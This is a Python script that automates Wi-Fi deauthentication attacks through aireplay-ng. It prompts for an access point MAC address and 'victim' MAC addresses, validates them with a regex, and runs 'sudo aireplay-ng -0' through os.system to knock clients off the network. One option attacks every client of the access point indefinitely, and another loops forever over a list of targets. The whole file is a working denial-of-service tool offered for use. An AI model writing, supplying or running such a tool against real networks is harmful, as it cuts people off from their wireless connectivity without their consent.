import re
import os
import sys

def match(y):
    mac_address_validate_pattern = "^(?:[0-9A-Fa-f]{2}[:-]){5}(?:[0-9A-Fa-f]{2})$"
    x=re.match(mac_address_validate_pattern,y) 
    return x

def validator(mac):
    validate=match(mac)
    if (validate==None):
        print("Enter correct mac address")
        return 1
    else:
        return 2
    


def deauth(amac,vmac,count):
    run='sudo aireplay-ng -0 {count} -a {amac} -c {vmac} wlan0'.format(amac=amac,vmac=vmac,count=count)
    os.system(run)

def deauth_all(amac):
    run='sudo aireplay-ng -0 0 -a {amac} wlan0'.format(amac=amac)
    os.system(run)

def userinputA():
    print("ENTER ACCESS POINT MAC ADDRESS")
    amac=input()
    afun=validator(amac)
    while (afun==1):
        amac=input()
        afun=validator(amac)
    return amac
    
def userinputV():
    print("ENTER VICTIM MAC ADDRESS")
    vmac=input()
    vfun=validator(vmac)
    while (vfun==1):
        vmac=input()
        vfun=validator(vmac)
    return vmac
    
    

def main():
    amac=userinputA()
    print("Enter the number of target devices or enter 99 to attack the access point")
    tnum=int(input())
    if tnum==99:
        deauth_all(amac)
        sys.exit()

 

    targetlist=[]
    
    for i in range(tnum):
        vmac=userinputV()

        if tnum==1:
            deauth(amac,vmac,0)

        else:
            targetlist.append(vmac)
    while True:
        for i in targetlist:
            deauth(amac,i,3)


main()

